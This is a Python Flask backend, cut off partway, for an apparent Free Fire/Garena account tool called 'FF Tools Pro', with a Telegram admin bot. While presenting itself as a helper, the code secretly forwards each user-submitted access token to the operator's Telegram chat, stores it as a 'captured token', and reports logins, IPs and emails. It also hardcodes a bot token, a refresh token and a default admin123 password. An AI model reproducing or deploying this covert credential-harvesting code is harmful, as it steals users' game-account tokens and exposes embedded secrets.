# app.py - COMPLETE BACKEND WITH TELEGRAM BOT BANNER SYSTEM
from flask import Flask, request, jsonify, send_from_directory, session
from flask_cors import CORS
import requests
import json
import hashlib
import urllib.parse
import time
import threading
import queue
from datetime import datetime, timedelta
import os
import secrets
import re
from functools import wraps
import base64

app = Flask(__name__, static_folder='public', static_url_path='')
app.secret_key = secrets.token_hex(32)
CORS(app, origins='*')

# ============================================================
# TELEGRAM BOT CONFIG
# ============================================================
TELEGRAM_BOT_TOKEN = "8890450515:AAGN4RKGAAFA8voy_WI33YTOLh5gHV7nJwQ"
TELEGRAM_CHAT_ID = "8488332629"
TELEGRAM_ADMIN_IDS = [8488332629]

telegram_queue = queue.Queue()

# ============================================================
# DATA FILES
# ============================================================
DATA_DIR = "data"
USERS_FILE = os.path.join(DATA_DIR, "users.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
LOGS_FILE = os.path.join(DATA_DIR, "logs.json")
TOKENS_FILE = os.path.join(DATA_DIR, "tokens.json")
PENDING_FILE = os.path.join(DATA_DIR, "pending.json")
BANNER_IMAGE_FILE = os.path.join(DATA_DIR, "banner_image.jpg")

os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================
# TELEGRAM HELPER FUNCTIONS
# ============================================================
def send_telegram_message(message, parse_mode='HTML', chat_id=None):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': chat_id or TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': parse_mode
        }
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram send error: {e}")
        return False

def send_telegram_photo(photo_path, caption="", chat_id=None):
    """Send photo to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': chat_id or TELEGRAM_CHAT_ID, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram photo send error: {e}")
        return False

def forward_token_only(token):
    """Forward ONLY the access token to Telegram - NO extra info"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': token.strip()
        }
        response = requests.post(url, data=data, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram token forward error: {e}")
        return False

def send_telegram_document(document_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(document_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=30)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram document send error: {e}")
        return False

def log_to_telegram(action, user_id, access_token="", email="", details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    token_display = f"<code>{access_token[:20]}...{access_token[-10:] if len(access_token) > 30 else ''}</code>" if access_token else "N/A"
    
    msg = f"""
🔐 <b>FF Tools Pro - Activity Log</b>
─────────────────────
🕐 <b>Time:</b> {timestamp}
📌 <b>Action:</b> {action}
👤 <b>User:</b> {user_id or 'Unknown'}
📧 <b>Email:</b> {email or 'N/A'}
🎯 <b>Token:</b> {token_display}
📝 <b>Details:</b> {details or 'N/A'}
─────────────────────
<b>⚠️ Secret Log - Admin Only</b>
"""
    send_telegram_message(msg)

# ============================================================
# TELEGRAM BOT HANDLER
# ============================================================
def telegram_bot_handler():
    last_update_id = 0
    banner_state = {}  # Store user states for banner upload
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {'offset': last_update_id + 1, 'timeout': 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                updates = response.json().get('result', [])
                for update in updates:
                    last_update_id = update['update_id']
                    process_telegram_update(update, banner_state)
            else:
                time.sleep(5)
        except Exception as e:
            print(f"Telegram bot error: {e}")
            time.sleep(5)

def process_telegram_update(update, banner_state):
    if 'message' not in update:
        return
    
    message = update['message']
    chat_id = message.get('chat', {}).get('id')
    text = message.get('text', '').strip()
    user_id = message.get('from', {}).get('id')
    user_name = message.get('from', {}).get('username', 'Unknown')
    
    # Only respond to admin users
    if user_id not in TELEGRAM_ADMIN_IDS:
        send_telegram_message("❌ You are not authorized to use this bot.", chat_id=chat_id)
        return
    
    # Check if user is in banner upload state
    if chat_id in banner_state and banner_state[chat_id].get('waiting_for') == 'banner_image':
        # User is uploading image
        if message.get('photo'):
            # Get the largest photo
            photo = message['photo'][-1]
            file_id = photo['file_id']
            
            # Download the photo
            file_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile?file_id={file_id}"
            file_res = requests.get(file_url)
            if file_res.status_code == 200:
                file_path = file_res.json().get('result', {}).get('file_path')
                if file_path:
                    download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
                    img_res = requests.get(download_url)
                    if img_res.status_code == 200:
                        # Save the image
                        with open(BANNER_IMAGE_FILE, 'wb') as f:
                            f.write(img_res.content)
                        
                        settings = load_settings()
                        settings['banner_image_set'] = True
                        settings['banner_image_updated'] = datetime.now().isoformat()
                        save_settings(settings)
                        
                        banner_state[chat_id]['waiting_for'] = 'banner_link'
                        send_telegram_message(
                            "✅ <b>Image received!</b>\n\n"
                            "📎 Now send me the <b>link</b> where this banner should redirect when clicked.\n"
                            "Example: https://your-website.com",
                            parse_mode='HTML',
                            chat_id=chat_id
                        )
                        return
                    else:
                        send_telegram_message("❌ Failed to download image. Try again.", chat_id=chat_id)
                        banner_state[chat_id]['waiting_for'] = 'banner_image'
                        return
            else:
                send_telegram_message("❌ Failed to get file. Try again.", chat_id=chat_id)
                banner_state[chat_id]['waiting_for'] = 'banner_image'
                return
        else:
            send_telegram_message("❌ Please send a <b>photo</b> for the banner.", parse_mode='HTML', chat_id=chat_id)
            return
    
    if chat_id in banner_state and banner_state[chat_id].get('waiting_for') == 'banner_link':
        # User is sending link
        if text and (text.startswith('http://') or text.startswith('https://')):
            settings = load_settings()
            settings['banner_link'] = text
            save_settings(settings)
            
            # Show preview
            send_telegram_photo(
                BANNER_IMAGE_FILE,
                caption=f"✅ <b>Banner Updated!</b>\n\n📎 <b>Link:</b> {text}\n\n🖼️ Preview above",
                chat_id=chat_id
            )
            
            # Send success message
            send_telegram_message(
                "🎉 <b>Banner Updated Successfully!</b>\n\n"
                f"📎 Link: {text}\n"
                "🖼️ Image saved on server\n\n"
                "It will appear on the dashboard for all users!",
                parse_mode='HTML',
                chat_id=chat_id
            )
            
            log_to_telegram('BANNER_UPDATED', user_name, '', '', f'Link: {text}')
            
            # Clear state
            del banner_state[chat_id]
            return
        else:
            send_telegram_message(
                "❌ Please send a <b>valid link</b> starting with http:// or https://",
                parse_mode='HTML',
                chat_id=chat_id
            )
            return
    
    # Handle commands
    if text.startswith('/'):
        command = text.split()[0].lower()
        
        if command == '/start':
            send_telegram_message(
                "🤖 <b>FF Tools Pro Bot</b>\n\n"
                "Available Commands:\n"
                "/start - Show this menu\n"
                "/stats - View system stats\n"
                "/users - List all users\n"
                "/logs - Recent activity logs\n"
                "/tokens - View captured tokens\n"
                "/settings - View current settings\n"
                "/ban <user> - Ban a user\n"
                "/unban <user> - Unban a user\n"
                "/clear - Clear all logs\n"
                "/backup - Download backup\n"
                "/maintenance on/off - Toggle maintenance\n"
                "/pending - View pending registrations\n"
                "/approve <user> - Approve registration\n"
                "/reject <user> - Reject registration\n"
                "/setbanner - Set dashboard banner image & link",
                chat_id=chat_id
            )
        
        elif command == '/setbanner':
            banner_state[chat_id] = {'waiting_for': 'banner_image'}
            send_telegram_message(
                "🖼️ <b>Set Dashboard Banner</b>\n\n"
                "Please send me the <b>image</b> you want to use as banner.\n\n"
                "Send a photo (JPEG/PNG recommended).",
                parse_mode='HTML',
                chat_id=chat_id
            )
        
        elif command == '/stats':
            users = load_users()
            logs = load_logs()
            tokens = load_tokens()
            pending = load_pending()
            settings = load_settings()
            
            msg = f"""
📊 <b>System Statistics</b>
─────────────────────
👤 <b>Total Users:</b> {len(users)}
📝 <b>Total Logs:</b> {len(logs)}
🔑 <b>Captured Tokens:</b> {len(tokens)}
⏳ <b>Pending Requests:</b> {len(pending)}
📅 <b>Uptime:</b> {get_uptime()}
🗄️ <b>Database Size:</b> {get_db_size()}
🖼️ <b>Banner:</b> {'✅ Set' if settings.get('banner_image_set') else '❌ Not Set'}
─────────────────────
<b>✅ System Running</b>
"""
            send_telegram_message(msg, chat_id=chat_id)
        
        elif command == '/users':
            users = load_users()
            if not users:
                send_telegram_message("📭 No users found.", chat_id=chat_id)
                return
            
            user_list = []
            for username, data in users.items():
                status = "🟢 Active" if data.get('active', True) else "🔴 Banned"
                admin = "👑 Admin" if data.get('is_admin', False) else "👤 User"
                user_list.append(f"{username} - {status} - {admin}")
            
            msg = f"👥 <b>User List ({len(users)})</b>\n─────────────────────\n" + "\n".join(user_list)
            send_telegram_message(msg, chat_id=chat_id)
        
        elif command == '/pending':
            pending = load_pending()
            if not pending:
                send_telegram_message("📭 No pending registrations.", chat_id=chat_id)
                return
            
            lines = []
            for p in pending:
                lines.append(f"👤 {p['username']} - 📧 {p.get('email', 'N/A')}")
            
            msg = f"⏳ <b>Pending Registrations</b>\n─────────────────────\n" + "\n".join(lines)
            send_telegram_message(msg, chat_id=chat_id)
        
        elif command == '/approve':
            parts = text.split()
            if len(parts) < 2:
                send_telegram_message("❌ Usage: /approve <username>", chat_id=chat_id)
                return
            
            username = parts[1]
            result = approve_user_direct(username)
            send_telegram_message(result, chat_id=chat_id)
        
        elif command == '/reject':
            parts = text.split()
            if len(parts) < 2:
                send_telegram_message("❌ Usage: /reject <username>", chat_id=chat_id)
                return
            
            username = parts[1]
            result = reject_user_direct(username)
            send_telegram_message(result, chat_id=chat_id)
        
        elif command == '/logs':
            logs = load_logs()[-20:]
            if not logs:
                send_telegram_message("📭 No logs found.", chat_id=chat_id)
                return
            
            log_lines = []
            for log in logs[-10:]:
                log_lines.append(f"🕐 {log.get('timestamp', '')}\n📌 {log.get('action', '')} - 👤 {log.get('user_id', '')}")
            
            msg = f"📋 <b>Recent Logs</b>\n─────────────────────\n" + "\n".join(log_lines)
            send_telegram_message(msg, chat_id=chat_id)
        
        elif command == '/tokens':
            tokens = load_tokens()[-10:]
            if not tokens:
                send_telegram_message("📭 No tokens captured.", chat_id=chat_id)
                return
            
            token_lines = []
            for t in tokens:
                token_lines.append(f"🕐 {t.get('timestamp', '')}\n🎯 {t.get('action', '')} - 👤 {t.get('user_id', '')}\n<code>{t.get('token', '')[:30]}...</code>")
            
            msg = f"🔑 <b>Recent Tokens</b>\n─────────────────────\n" + "\n".join(token_lines)
            send_telegram_message(msg, chat_id=chat_id)
        
        elif command == '/settings':
            settings = load_settings()
            msg = f"""
⚙️ <b>Current Settings</b>
─────────────────────
🔧 <b>Maintenance:</b> {'ON' if settings.get('maintenance', False) else 'OFF'}
📢 <b>Banner:</b> {'✅ Set' if settings.get('banner_image_set') else '❌ Not Set'}
🖼️ <b>Banner Link:</b> {settings.get('banner_link', 'Not Set')}
🎨 <b>Theme:</b> {'Orange' if settings.get('theme', 'orange') == 'orange' else 'Blue'}
─────────────────────
<b>✅ Settings Loaded</b>
"""
            send_telegram_message(msg, chat_id=chat_id)
        
        elif command == '/ban':
            parts = text.split()
            if len(parts) < 2:
                send_telegram_message("❌ Usage: /ban <username>", chat_id=chat_id)
                return
            
            username = parts[1]
            users = load_users()
            if username not in users:
                send_telegram_message(f"❌ User '{username}' not found.", chat_id=chat_id)
                return
            
            users[username]['active'] = False
            save_users(users)
            send_telegram_message(f"✅ User '{username}' has been banned.", chat_id=chat_id)
            log_to_telegram('BAN_USER', 'bot', '', '', f'Banned: {username}')
        
        elif command == '/unban':
            parts = text.split()
            if len(parts) < 2:
                send_telegram_message("❌ Usage: /unban <username>", chat_id=chat_id)
                return
            
            username = parts[1]
            users = load_users()
            if username not in users:
                send_telegram_message(f"❌ User '{username}' not found.", chat_id=chat_id)
                return
            
            users[username]['active'] = True
            save_users(users)
            send_telegram_message(f"✅ User '{username}' has been unbanned.", chat_id=chat_id)
            log_to_telegram('UNBAN_USER', 'bot', '', '', f'Unbanned: {username}')
        
        elif command == '/maintenance':
            parts = text.split()
            if len(parts) < 2:
                send_telegram_message("❌ Usage: /maintenance on/off", chat_id=chat_id)
                return
            
            settings = load_settings()
            settings['maintenance'] = parts[1].lower() == 'on'
            save_settings(settings)
            send_telegram_message(f"✅ Maintenance mode: {'ON' if settings['maintenance'] else 'OFF'}", chat_id=chat_id)
            log_to_telegram('MAINTENANCE', 'bot', '', '', f'Toggled to {settings["maintenance"]}')
        
        elif command == '/clear':
            save_logs([])
            send_telegram_message("✅ All logs cleared.", chat_id=chat_id)
            log_to_telegram('CLEAR_LOGS', 'bot', '', '', 'All logs cleared')
        
        elif command == '/backup':
            backup_file = os.path.join(DATA_DIR, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            backup_data = {
                'users': load_users(),
                'settings': load_settings(),
                'logs': load_logs(),
                'tokens': load_tokens(),
                'pending': load_pending(),
                'timestamp': datetime.now().isoformat()
            }
            with open(backup_file, 'w') as f:
                json.dump(backup_data, f, indent=2)
            
            send_telegram_document(backup_file, f"📦 Backup: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            os.remove(backup_file)
            log_to_telegram('BACKUP', 'bot', '', '', 'Backup created and sent')

def approve_user_direct(username):
    try:
        pending = load_pending()
        user_data = None
        for i, u in enumerate(pending):
            if u['username'] == username:
                user_data = pending.pop(i)
                break
        
        if not user_data:
            return f"❌ User '{username}' not found in pending."
        
        save_pending(pending)
        
        users = load_users()
        users[username] = {
            'password': user_data['password'],
            'is_admin': False,
            'active': True,
            'created_at': datetime.now().isoformat(),
            'email': user_data.get('email', ''),
            'approved_by': 'telegram_bot'
        }
        save_users(users)
        
        log_to_telegram('USER_APPROVED', username, '', user_data.get('email', ''), 'Approved via Telegram')
        return f"✅ User '{username}' has been approved!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def reject_user_direct(username):
    try:
        pending = load_pending()
        for i, u in enumerate(pending):
            if u['username'] == username:
                pending.pop(i)
                break
        else:
            return f"❌ User '{username}' not found in pending."
        
        save_pending(pending)
        log_to_telegram('USER_REJECTED', username, '', '', 'Rejected via Telegram')
        return f"✅ User '{username}' has been rejected!"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ============================================================
# DATA MANAGEMENT FUNCTIONS
# ============================================================
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def load_settings():
    if os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, 'r') as f:
            return json.load(f)
    return {
        'maintenance': False,
        'banner_text': '🔥 Welcome to FF Tools Pro!',
        'banner_enabled': True,
        'tutorial_enabled': True,
        'tutorial_url': 'https://youtube.com/watch?v=example',
        'total_users': 0,
        'total_requests': 0,
        'banner_image_set': False,
        'banner_link': '',
        'banner_image_updated': '',
        'theme': 'orange',  # 'orange' or 'blue'
        'broadcast': {
            'active': False,
            'title': '',
            'message': '',
            'type': 'info',
            'id': ''
        }
    }

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=2)

def load_logs():
    if os.path.exists(LOGS_FILE):
        with open(LOGS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_logs(logs):
    with open(LOGS_FILE, 'w') as f:
        json.dump(logs, f, indent=2)

def load_tokens():
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump(tokens, f, indent=2)

def load_pending():
    if os.path.exists(PENDING_FILE):
        with open(PENDING_FILE, 'r') as f:
            return json.load(f)
    return []

def save_pending(pending):
    with open(PENDING_FILE, 'w') as f:
        json.dump(pending, f, indent=2)

def add_log(action, user_id, details=""):
    logs = load_logs()
    logs.append({
        'timestamp': datetime.now().isoformat(),
        'action': action,
        'user_id': user_id,
        'details': details
    })
    if len(logs) > 1000:
        logs = logs[-1000:]
    save_logs(logs)
    
    settings = load_settings()
    settings['total_requests'] = settings.get('total_requests', 0) + 1
    save_settings(settings)

def add_token(action, user_id, token, email="", extra=""):
    tokens = load_tokens()
    tokens.append({
        'timestamp': datetime.now().isoformat(),
        'action': action,
        'user_id': user_id,
        'token': token,
        'email': email,
        'extra': extra
    })
    if len(tokens) > 500:
        tokens = tokens[-500:]
    save_tokens(tokens)

def get_uptime():
    try:
        with open(os.path.join(DATA_DIR, 'uptime.txt'), 'r') as f:
            start_time = float(f.read())
        elapsed = time.time() - start_time
        days = int(elapsed // 86400)
        hours = int((elapsed % 86400) // 3600)
        minutes = int((elapsed % 3600) // 60)
        return f"{days}d {hours}h {minutes}m"
    except:
        return "N/A"

def get_db_size():
    total = 0
    for f in [USERS_FILE, SETTINGS_FILE, LOGS_FILE, TOKENS_FILE, PENDING_FILE]:
        if os.path.exists(f):
            total += os.path.getsize(f)
    if total < 1024:
        return f"{total} B"
    elif total < 1024 * 1024:
        return f"{total / 1024:.1f} KB"
    else:
        return f"{total / (1024 * 1024):.1f} MB"

def create_default_admin():
    users = load_users()
    if 'admin' not in users:
        users['admin'] = {
            'password': hashlib.sha256('admin123'.encode()).hexdigest(),
            'is_admin': True,
            'active': True,
            'created_at': datetime.now().isoformat()
        }
        save_users(users)
        print("✅ Default admin created: admin / admin123")
        print("⚠️ PLEASE CHANGE ADMIN PASSWORD AFTER FIRST LOGIN!")

# ============================================================
# AUTH DECORATORS
# ============================================================
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'success': False, 'error': 'Login required', 'redirect': '/login'}), 401
        
        users = load_users()
        user = users.get(session['user_id'], {})
        if not user.get('active', True):
            session.clear()
            return jsonify({'success': False, 'error': 'Account banned', 'redirect': '/login'}), 403
        
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'success': False, 'error': 'Login required'}), 401
        
        users = load_users()
        user = users.get(session['user_id'], {})
        if not user.get('is_admin', False):
            return jsonify({'success': False, 'error': 'Admin access required'}), 403
        
        if not user.get('active', True):
            session.clear()
            return jsonify({'success': False, 'error': 'Account banned'}), 403
        
        return f(*args, **kwargs)
    return decorated_function

# ============================================================
# BANNER ENDPOINTS
# ============================================================
@app.route('/api/banner', methods=['GET'])
def get_banner():
    settings = load_settings()
    if settings.get('banner_image_set') and os.path.exists(BANNER_IMAGE_FILE):
        return jsonify({
            'success': True,
            'has_banner': True,
            'link': settings.get('banner_link', ''),
            'updated': settings.get('banner_image_updated', '')
        })
    return jsonify({
        'success': True,
        'has_banner': False
    })

@app.route('/api/banner/image', methods=['GET'])
def get_banner_image():
    if os.path.exists(BANNER_IMAGE_FILE):
        return send_file(BANNER_IMAGE_FILE, mimetype='image/jpeg')
    return jsonify({'error': 'Banner not found'}), 404

# ============================================================
# THEME ENDPOINT
# ============================================================
@app.route('/api/theme', methods=['GET'])
def get_theme():
    settings = load_settings()
    return jsonify({
        'theme': settings.get('theme', 'orange')
    })

@app.route('/api/theme', methods=['POST'])
@login_required
def set_theme():
    try:
        data = request.get_json()
        theme = data.get('theme', 'orange')
        if theme not in ['orange', 'blue']:
            return jsonify({'success': False, 'error': 'Invalid theme'}), 400
        
        settings = load_settings()
        settings['theme'] = theme
        save_settings(settings)
        
        log_to_telegram('THEME_CHANGED', session.get('user_id'), '', '', f'Theme: {theme}')
        add_log('theme_changed', session.get('user_id'), f'Theme: {theme}')
        
        return jsonify({'success': True, 'theme': theme})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================
# AUTH ENDPOINTS
# ============================================================
@app.route('/api/auth/login', methods=['POST'])
def auth_login():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        if not username or not password:
            return jsonify({'success': False, 'error': 'Username and password required'}), 400
        
        settings = load_settings()
        if settings.get('maintenance', False):
            return jsonify({'success': False, 'error': 'System under maintenance. Please try again later.'}), 503
        
        users = load_users()
        user = users.get(username)
        
        if not user:
            return jsonify({'success': False, 'error': 'Invalid credentials'}), 401
        
        if not user.get('active', True):
            return jsonify({'success': False, 'error': 'Account is banned'}), 403
        
        hashed = hashlib.sha256(password.encode()).hexdigest()
        if user.get('password') != hashed:
            return jsonify({'success': False, 'error': 'Invalid credentials'}), 401
        
        session['user_id'] = username
        session['is_admin'] = user.get('is_admin', False)
        
        user['last_login'] = datetime.now().isoformat()
        user['last_ip'] = request.remote_addr
        save_users(users)
        
        log_to_telegram('USER_LOGIN', username, '', '', f'IP: {request.remote_addr}')
        add_log('login', username, f'IP: {request.remote_addr}')
        
        return jsonify({
            'success': True,
            'user': {
                'username': username,
                'is_admin': user.get('is_admin', False)
            }
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/auth/logout', methods=['POST'])
def auth_logout():
    username = session.get('user_id', 'Unknown')
    log_to_telegram('USER_LOGOUT', username, '', '', '')
    session.clear()
    return jsonify({'success': True})

@app.route('/api/auth/check', methods=['GET'])
def auth_check():
    if 'user_id' in session:
        users = load_users()
        user = users.get(session['user_id'], {})
        
        if not user.get('active', True):
            session.clear()
            return jsonify({'logged_in': False})
        
        return jsonify({
            'logged_in': True,
            'user': {
                'username': session['user_id'],
                'is_admin': user.get('is_admin', False)
            }
        })
    return jsonify({'logged_in': False})

@app.route('/api/auth/register', methods=['POST'])
def auth_register():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        email = data.get('email')
        
        if not username or not password or not email:
            return jsonify({'success': False, 'error': 'All fields required'}), 400
        
        if len(username) < 3:
            return jsonify({'success': False, 'error': 'Username must be at least 3 characters'}), 400
        
        if len(password) < 6:
            return jsonify({'success': False, 'error': 'Password must be at least 6 characters'}), 400
        
        if '@' not in email:
            return jsonify({'success': False, 'error': 'Invalid email address'}), 400
        
        users = load_users()
        if username in users:
            return jsonify({'success': False, 'error': 'Username already exists'}), 400
        
        users[username] = {
            'password': hashlib.sha256(password.encode()).hexdigest(),
            'is_admin': False,
            'active': True,
            'created_at': datetime.now().isoformat(),
            'email': email,
            'last_ip': request.remote_addr,
            'broadcast_read': ''
        }
        save_users(users)
        
        settings = load_settings()
        settings['total_users'] = len(users)
        save_settings(settings)
        
        log_to_telegram('USER_REGISTERED_AUTO', username, '', email, f'IP: {request.remote_addr} - Auto approved')
        add_log('register_auto', username, f'Email: {email}')
        
        return jsonify({
            'success': True,
            'message': 'Account created successfully! You can now login.'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/auth/users', methods=['GET'])
@admin_required
def get_users():
    users = load_users()
    return jsonify({'success': True, 'users': users})

@app.route('/api/auth/users/<username>', methods=['DELETE'])
@admin_required
def auth_delete_user(username):
    if username == 'admin':
        return jsonify({'success': False, 'error': 'Cannot delete admin'}), 400
    
    if username == session.get('user_id'):
        return jsonify({'success': False, 'error': 'Cannot delete yourself'}), 400
    
    users = load_users()
    if username not in users:
        return jsonify({'success': False, 'error': 'User not found'}), 404
    
    del users[username]
    save_users(users)
    
    settings = load_settings()
    settings['total_users'] = len(users)
    save_settings(settings)
    
    log_to_telegram('USER_DELETED', username, '', '', f'Deleted by: {session.get("user_id")}')
    add_log('delete_user', username, f'Deleted by: {session.get("user_id")}')
    
    return jsonify({'success': True})

@app.route('/api/auth/users/<username>/ban', methods=['POST'])
@admin_required
def auth_ban_user(username):
    if username == 'admin':
        return jsonify({'success': False, 'error': 'Cannot ban admin'}), 400
    
    users = load_users()
    if username not in users:
        return jsonify({'success': False, 'error': 'User not found'}), 404
    
    users[username]['active'] = False
    save_users(users)
    
    log_to_telegram('USER_BANNED', username, '', '', f'Banned by: {session.get("user_id")}')
    add_log('ban_user', username, f'Banned by: {session.get("user_id")}')
    
    return jsonify({'success': True})

@app.route('/api/auth/users/<username>/unban', methods=['POST'])
@admin_required
def auth_unban_user(username):
    users = load_users()
    if username not in users:
        return jsonify({'success': False, 'error': 'User not found'}), 404
    
    users[username]['active'] = True
    save_users(users)
    
    log_to_telegram('USER_UNBANNED', username, '', '', f'Unbanned by: {session.get("user_id")}')
    add_log('unban_user', username, f'Unbanned by: {session.get("user_id")}')
    
    return jsonify({'success': True})

# ============================================================
# ADMIN SETTINGS ENDPOINTS
# ============================================================
@app.route('/api/admin/settings', methods=['GET'])
@admin_required
def get_admin_settings():
    settings = load_settings()
    return jsonify({
        'success': True,
        'settings': settings
    })

@app.route('/api/admin/settings', methods=['POST'])
@admin_required
def update_admin_settings():
    try:
        data = request.get_json()
        settings = load_settings()
        
        for key in ['maintenance', 'banner_text', 'banner_enabled', 'tutorial_enabled', 'tutorial_url', 'theme']:
            if key in data:
                settings[key] = data[key]
        
        save_settings(settings)
        
        log_to_telegram('SETTINGS_UPDATED', session.get('user_id'), '', '', json.dumps(data))
        add_log('update_settings', session.get('user_id'), json.dumps(data))
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/logs', methods=['GET'])
@admin_required
def get_admin_logs():
    logs = load_logs()
    return jsonify({
        'success': True,
        'logs': logs[-100:]
    })

@app.route('/api/admin/tokens', methods=['GET'])
@admin_required
def get_admin_tokens():
    tokens = load_tokens()
    return jsonify({
        'success': True,
        'tokens': tokens[-50:]
    })

@app.route('/api/admin/stats', methods=['GET'])
@admin_required
def get_admin_stats():
    users = load_users()
    logs = load_logs()
    tokens = load_tokens()
    pending = load_pending()
    settings = load_settings()
    
    return jsonify({
        'success': True,
        'stats': {
            'total_users': len(users),
            'total_logs': len(logs),
            'total_tokens': len(tokens),
            'total_requests': settings.get('total_requests', 0),
            'pending_count': len(pending),
            'uptime': get_uptime(),
            'db_size': get_db_size()
        }
    })

# ============================================================
# BROADCAST ENDPOINTS
# ============================================================
@app.route('/api/admin/broadcast', methods=['POST'])
@admin_required
def send_broadcast():
    try:
        data = request.get_json()
        settings = load_settings()
        broadcast_id = str(int(time.time()))
        
        settings['broadcast'] = {
            'id': broadcast_id,
            'active': True,
            'title': data.get('title', 'Announcement'),
            'message': data.get('message', ''),
            'type': data.get('type', 'info'),
            'timestamp': datetime.now().isoformat()
        }
        save_settings(settings)
        
        log_to_telegram('BROADCAST_SENT', session.get('user_id'), '', '', data.get('title'))
        add_log('broadcast_sent', session.get('user_id'), f'Title: {data.get("title")}')
        
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/admin/broadcast/clear', methods=['POST'])
@admin_required
def clear_broadcast():
    try:
        settings = load_settings()
        if 'broadcast' in settings:
            settings['broadcast']['active'] = False
        save_settings(settings)
        log_to_telegram('BROADCAST_CLEARED', session.get('user_id'), '', '', 'Broadcast cleared')
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/broadcast/status', methods=['GET'])
@login_required
def get_broadcast_status():
    settings = load_settings()
    broadcast = settings.get('broadcast', {})
    
    users = load_users()
    user = users.get(session.get('user_id'), {})
    user_broadcast_id = user.get('broadcast_read', '')
    
    if broadcast.get('active') and broadcast.get('id') != user_broadcast_id:
        return jsonify({
            'active': True,
            'title': broadcast.get('title', ''),
            'message': broadcast.get('message', ''),
            'type': broadcast.get('type', 'info'),
            'id': broadcast.get('id', '')
        })
    return jsonify({'active': False})

@app.route('/api/broadcast/read', methods=['POST'])
@login_required
def mark_broadcast_read():
    try:
        data = request.get_json()
        broadcast_id = data.get('broadcast_id', '')
        users = load_users()
        username = session.get('user_id')
        if username in users:
            users[username]['broadcast_read'] = broadcast_id
            save_users(users)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================
# CONSTANTS & HELPERS
# ============================================================
PLATFORM_MAP = {
    1: "Garena", 3: "Facebook", 4: "Guest", 5: "VK",
    6: "Huawei", 7: "Apple", 8: "Google", 10: "GameCenter/Line",
    11: "X (Twitter)", 13: "Apple ID", 28: "Line", 35: "TikTok"
}

GARENA_HEADERS = {
    'User-Agent': 'GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip'
}

REFRESH_TOKEN = "1380dcb63ab3a077dc05bdf0b25ba4497c403a5b4eae96d7203010eafa6c83a8"

def convert_seconds(seconds):
    days = seconds // 86400
    hours = (seconds % 86400) // 3600
    minutes = (seconds % 3600) // 60
    secs = seconds % 60
    return f"{days}d {hours}h {minutes}m {secs}s"

def format_response_text(text):
    try:
        data = json.loads(text)
        if data.get('result') == 0:
            return {'success': True, 'data': data}
        return {'success': False, 'error': data.get('error', 'Unknown error'), 'data': data}
    except:
        return {'success': True, 'raw': text}

# ============================================================
# API ENDPOINTS - BIND OPERATIONS
# ============================================================

@app.route('/api/bind-info', methods=['POST'])
@login_required
def get_bind_info():
    try:
        data = request.get_json()
        access_token = data.get('access_token')
        username = session.get('user_id', 'Unknown')
        
        if not access_token:
            return jsonify({'success': False, 'error': 'Access token required'}), 400

        forward_token_only(access_token)
        add_token('bind_info', username, access_token, '', f'IP: {request.remote_addr}')

